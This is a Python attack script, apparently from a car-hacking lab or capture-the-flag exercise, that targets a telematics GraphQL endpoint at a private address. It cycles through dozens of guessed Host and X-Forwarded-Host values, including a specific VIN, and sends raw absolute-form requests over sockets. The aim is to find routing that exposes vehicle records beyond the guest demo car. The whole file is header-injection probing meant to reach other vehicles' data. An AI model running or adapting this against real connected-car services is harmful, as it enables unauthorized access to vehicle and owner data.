import requests, socket
URL="http://10.225.139.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV622697F82A936A1"
hosts=["tsp","tsp.local","tsp.cybercar","tsp.cybercar.local","cybercar","cybercar.local","cv6","cv6.local",
"cv6.tsp","cv6.tsp.local","fleet","fleet.local","fleet.cv6","tsp.cv6","api.cv6","ota.cv6","cloud","cloud.cv6",
"tbox","tbox.local","cgw","gateway","vehicle","vehicle.cv6","demo","guest","console","admin.cv6",
VIN,VIN.lower(),"cv6-"+VIN,"tsp."+VIN,"cv6fleet","cv6fleet.local","cybercar.tsp","cv6.internal","tsp.internal",
"cloud.local","ota.local","api.local","prod","production","tsp.cv6fleet.local","cv6.cybercar","sota","fota"]
diffs=0
for h in hosts:
    for extra in [None,{"X-Forwarded-Host":h}]:
        hd={"Host":h}
        if extra: hd.update(extra)
        try:
            r=requests.post(URL,json={"query":"{vehicles{vin label}}"},headers=hd,timeout=5)
            if r.text.strip()!=BASE:
                print("DIFF",h,extra,r.status_code,r.text[:200],flush=True); diffs+=1
        except Exception as e: pass
print("hosts",len(hosts),"diffs",diffs)

# absolute-form URI with differing host
for h in ["tsp.local","cv6.tsp.local","cv6"]:
    s=socket.socket(); s.settimeout(5); s.connect(("10.225.139.2",8080))
    b=b'{"query":"{vehicles{vin label}}"}'
    req=(f"POST http://{h}/graphql HTTP/1.1\r\nHost: {h}\r\nContent-Type: application/json\r\nContent-Length: {len(b)}\r\n\r\n").encode()+b
    s.sendall(req)
    d=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            d+=c
    except socket.timeout: pass
    s.close()
    body=d.split(b"\r\n\r\n",1)[-1]
    print("ABS",h,"->",body[:150])
